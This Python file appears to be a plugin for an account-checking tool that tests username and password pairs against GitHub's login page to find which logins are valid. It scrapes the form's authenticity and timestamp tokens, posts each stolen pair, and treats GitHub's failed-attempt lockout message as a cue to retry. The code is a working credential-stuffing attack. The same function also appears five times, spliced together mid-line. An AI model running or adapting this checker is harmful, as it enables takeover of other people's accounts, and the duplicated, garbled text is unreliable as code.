# -*- coding: utf-8 -*-

"""
NAME:    github-reqs.py
AUTHOR:  andre798
VERSION: 1.0.0
DATE:    13.10.2020 
DESC:    A PyBullet-based script to check which GitHub logins are valid
         using requests library.
"""

from chkutils import ChkUtils

def chkMain(ss, test, rst, captcha, data):
    # Good practice, since 'data' can be both a list or string variable,
    # depending on the number of elements in each line
    if isinstance(data, list):
        user = data[0]
        pswd = data[1]
    else:
        # -200 = Exception = Terminate program!
        return [-200, 'Invalid list format']
    
    # Class containing a list of useful functions.
    chk = ChkUtils()
    
    # Login GET link.
    lnk = 'https://github.com/login'
    
    # Retrieve the login page.
    r = chk.getnlog(ss, lnk, 'login.htm', 'github', user)
    
    # Obtain the necessary login tokens.
    auth_tok = chk.grab(r.text, 'authenticity_token" value="', '"')
    tstamp = chk.grab(r.text, 'timestamp" value="', '"')
    tsecret = chk.grab(r.text, 'timestamp_secret" value="', '"')
    
    # Check if any tokens are missing.
    if len(auth_tok) == 0 or len(tstamp) == 0 or len(tsecret) == 0:
        # -1 = Error = Retry!
        return [-1, 'Missing token']   
    elif test == 1:
        # Print the tokens if running in test mode.
        print('> authenticity_token: ' + auth_tok)
        print('> timestamp: ' + tstamp)
        print('> timestamp_secret: ' + tsecret)
    
    # Login POST link
    lnk = 'https://github.com/session'
    
    # Login POST data dict
    data = {'commit': 'Sign in', 
            'authenticity_token': auth_tok, 
            # Not sure whats the 'ga_id' for, but it works using always the
            # same value.
            'ga_id': '1348735984.1584973938',
            'login': user,
            'password': pswd,
            'webauthn-support': 'supported',
            'webauthn-iuvpaa-support': 'unsupported',
            'return_to': '',
            'allow_signup': '',
            'client_id': '',
            'integration': '',
            'required_field_d202': '',
            'timestamp': tstamp,
            'timestamp_secret': tsecret }
    
    # Attempt to login.
    r = chk.postnlog(ss, lnk, 'login.htm', 'github', user, data = data)
    
    # Evaluate the login attempt.
    if r.text.find('Signed in as') != -1:
        return [100, user] # 100 = Valid password (display in green)
    elif r.text.find('Incorrect username or password.') != -1:
        return [200, user] # 200 = Invalid password (display in red)   
    elif r.text.find('There have been several failed attempts') != -1:
        return [-2, user] # -2 = Error = Retry!
    else:
        return [0, user] # 0 = Unknown = Skip (display in yellow)def chkMain(ss, test, rst, captcha, data):
    # Good practice, since 'data' can be both a list or string variable,
    # depending on the number of elements in each line
    if isinstance(data, list):
        user = data[0]
        pswd = data[1]
    else:
        # -200 = Exception = Terminate program!
        return [-200, 'Invalid list format']
    
    # Class containing a list of useful functions.
    chk = ChkUtils()
    
    # Login GET link.
    lnk = 'https://github.com/login'
    
    # Retrieve the login page.
    r = chk.getnlog(ss, lnk, 'login.htm', 'github', user)
    
    # Obtain the necessary login tokens.
    auth_tok = chk.grab(r.text, 'authenticity_token" value="', '"')
    tstamp = chk.grab(r.text, 'timestamp" value="', '"')
    tsecret = chk.grab(r.text, 'timestamp_secret" value="', '"')
    
    # Check if any tokens are missing.
    if len(auth_tok) == 0 or len(tstamp) == 0 or len(tsecret) == 0:
        # -1 = Error = Retry!
        return [-1, 'Missing token']   
    elif test == 1:
        # Print the tokens if running in test mode.
        print('> authenticity_token: ' + auth_tok)
        print('> timestamp: ' + tstamp)
        print('> timestamp_secret: ' + tsecret)
    
    # Login POST link
    lnk = 'https://github.com/session'
    
    # Login POST data dict
    data = {'commit': 'Sign in', 
            'authenticity_token': auth_tok, 
            # Not sure whats the 'ga_id' for, but it works using always the
            # same value.
            'ga_id': '1348735984.1584973938',
            'login': user,
            'password': pswd,
            'webauthn-support': 'supported',
            'webauthn-iuvpaa-support': 'unsupported',
            'return_to': '',
            'allow_signup': '',
            'client_id': '',
            'integration': '',
            'required_field_d202': '',
            'timestamp': tstamp,
            'timestamp_secret': tsecret }
    
    # Attempt to login.
    r = chk.postnlog(ss, lnk, 'login.htm', 'github', user, data = data)
    
    # Evaluate the login attempt.
    if r.text.find('Signed in as') != -1:
        return [100, user] # 100 = Valid password (display in green)
    elif r.text.find('Incorrect username or password.') != -1:
        return [200, user] # 200 = Invalid password (display in red)   
    elif r.text.find('There have been several failed attempts') != -1:
        return [-2, user] # -2 = Error = Retry!
    else:
        return [0, user] # 0 = Unknown = Skip (display in yellow)def chkMain(ss, test, rst, captcha, data):
    # Good practice, since 'data' can be both a list or string variable,
    # depending on the number of elements in each line
    if isinstance(data, list):
        user = data[0]
        pswd = data[1]
    else:
        # -200 = Exception = Terminate program!
        return [-200, 'Invalid list format']
    
    # Class containing a list of useful functions.
    chk = ChkUtils()
    
    # Login GET link.
    lnk = 'https://github.com/login'
    
    # Retrieve the login page.
    r = chk.getnlog(ss, lnk, 'login.htm', 'github', user)
    
    # Obtain the necessary login tokens.
    auth_tok = chk.grab(r.text, 'authenticity_token" value="', '"')
    tstamp = chk.grab(r.text, 'timestamp" value="', '"')
    tsecret = chk.grab(r.text, 'timestamp_secret" value="', '"')
    
    # Check if any tokens are missing.
    if len(auth_tok) == 0 or len(tstamp) == 0 or len(tsecret) == 0:
        # -1 = Error = Retry!
        return [-1, 'Missing token']   
    elif test == 1:
        # Print the tokens if running in test mode.
        print('> authenticity_token: ' + auth_tok)
        print('> timestamp: ' + tstamp)
        print('> timestamp_secret: ' + tsecret)
    
    # Login POST link
    lnk = 'https://github.com/session'
    
    # Login POST data dict
    data = {'commit': 'Sign in', 
            'authenticity_token': auth_tok, 
            # Not sure whats the 'ga_id' for, but it works using always the
            # same value.
            'ga_id': '1348735984.1584973938',
            'login': user,
            'password': pswd,
            'webauthn-support': 'supported',
            'webauthn-iuvpaa-support': 'unsupported',
            'return_to': '',
            'allow_signup': '',
            'client_id': '',
            'integration': '',
            'required_field_d202': '',
            'timestamp': tstamp,
            'timestamp_secret': tsecret }
    
    # Attempt to login.
    r = chk.postnlog(ss, lnk, 'login.htm', 'github', user, data = data)
    
    # Evaluate the login attempt.
    if r.text.find('Signed in as') != -1:
        return [100, user] # 100 = Valid password (display in green)
    elif r.text.find('Incorrect username or password.') != -1:
        return [200, user] # 200 = Invalid password (display in red)   
    elif r.text.find('There have been several failed attempts') != -1:
        return [-2, user] # -2 = Error = Retry!
    else:
        return [0, user] # 0 = Unknown = Skip (display in yellow)def chkMain(ss, test, rst, captcha, data):
    # Good practice, since 'data' can be both a list or string variable,
    # depending on the number of elements in each line
    if isinstance(data, list):
        user = data[0]
        pswd = data[1]
    else:
        # -200 = Exception = Terminate program!
        return [-200, 'Invalid list format']
    
    # Class containing a list of useful functions.
    chk = ChkUtils()
    
    # Login GET link.
    lnk = 'https://github.com/login'
    
    # Retrieve the login page.
    r = chk.getnlog(ss, lnk, 'login.htm', 'github', user)
    
    # Obtain the necessary login tokens.
    auth_tok = chk.grab(r.text, 'authenticity_token" value="', '"')
    tstamp = chk.grab(r.text, 'timestamp" value="', '"')
    tsecret = chk.grab(r.text, 'timestamp_secret" value="', '"')
    
    # Check if any tokens are missing.
    if len(auth_tok) == 0 or len(tstamp) == 0 or len(tsecret) == 0:
        # -1 = Error = Retry!
        return [-1, 'Missing token']   
    elif test == 1:
        # Print the tokens if running in test mode.
        print('> authenticity_token: ' + auth_tok)
        print('> timestamp: ' + tstamp)
        print('> timestamp_secret: ' + tsecret)
    
    # Login POST link
    lnk = 'https://github.com/session'
    
    # Login POST data dict
    data = {'commit': 'Sign in', 
            'authenticity_token': auth_tok, 
            # Not sure whats the 'ga_id' for, but it works using always the
            # same value.
            'ga_id': '1348735984.1584973938',
            'login': user,
            'password': pswd,
            'webauthn-support': 'supported',
            'webauthn-iuvpaa-support': 'unsupported',
            'return_to': '',
            'allow_signup': '',
            'client_id': '',
            'integration': '',
            'required_field_d202': '',
            'timestamp': tstamp,
            'timestamp_secret': tsecret }
    
    # Attempt to login.
    r = chk.postnlog(ss, lnk, 'login.htm', 'github', user, data = data)
    
    # Evaluate the login attempt.
    if r.text.find('Signed in as') != -1:
        return [100, user] # 100 = Valid password (display in green)
    elif r.text.find('Incorrect username or password.') != -1:
        return [200, user] # 200 = Invalid password (display in red)   
    elif r.text.find('There have been several failed attempts') != -1:
        return [-2, user] # -2 = Error = Retry!
    else:
        return [0, user] # 0 = Unknown = Skip (display in yellow)def chkMain(ss, test, rst, captcha, data):
    # Good practice, since 'data' can be both a list or string variable,
    # depending on the number of elements in each line
    if isinstance(data, list):
        user = data[0]
        pswd = data[1]
    else:
        # -200 = Exception = Terminate program!
        return [-200, 'Invalid list format']
    
    # Class containing a list of useful functions.
    chk = ChkUtils()
    
    # Login GET link.
    lnk = 'https://github.com/login'
    
    # Retrieve the login page.
    r = chk.getnlog(ss, lnk, 'login.htm', 'github-reqs', user)
    
    # Obtain the necessary login tokens.
    auth_tok = chk.grab(r.text, 'authenticity_token" value="', '"')
    tstamp = chk.grab(r.text, 'timestamp" value="', '"')
    tsecret = chk.grab(r.text, 'timestamp_secret" value="', '"')
    
    # Check if any tokens are missing.
    if len(auth_tok) == 0 or len(tstamp) == 0 or len(tsecret) == 0:
        # -1 = Error = Retry!
        return [-1, 'Missing token']   
    elif test == 1:
        # Print the tokens if running in test mode.
        print('> authenticity_token: ' + auth_tok)
        print('> timestamp: ' + tstamp)
        print('> timestamp_secret: ' + tsecret)
    
    # Login POST link
    lnk = 'https://github.com/session'
    
    # Login POST data dict
    data = {'commit': 'Sign in', 
            'authenticity_token': auth_tok, 
            # Not sure whats the 'ga_id' for, but it works using always the
            # same value.
            'ga_id': '1348735984.1584973938',
            'login': user,
            'password': pswd,
            'webauthn-support': 'supported',
            'webauthn-iuvpaa-support': 'unsupported',
            'return_to': '',
            'allow_signup': '',
            'client_id': '',
            'integration': '',
            'required_field_d202': '',
            'timestamp': tstamp,
            'timestamp_secret': tsecret }
    
    # Attempt to login.
    r = chk.postnlog(ss, lnk, 'session.htm', 'github-reqs', user, data = data)
    
    # Evaluate the login attempt.
    if r.text.find('Signed in as') != -1:
        return [100, user] # 100 = Valid password (display in green)
    elif r.text.find('Incorrect username or password.') != -1:
        return [200, user] # 200 = Invalid password (display in red)   
    elif r.text.find('There have been several failed attempts') != -1:
        return [-2, user] # -2 = Error = Retry!
    else:
        return [0, user] # 0 = Unknown = Skip (display in yellow)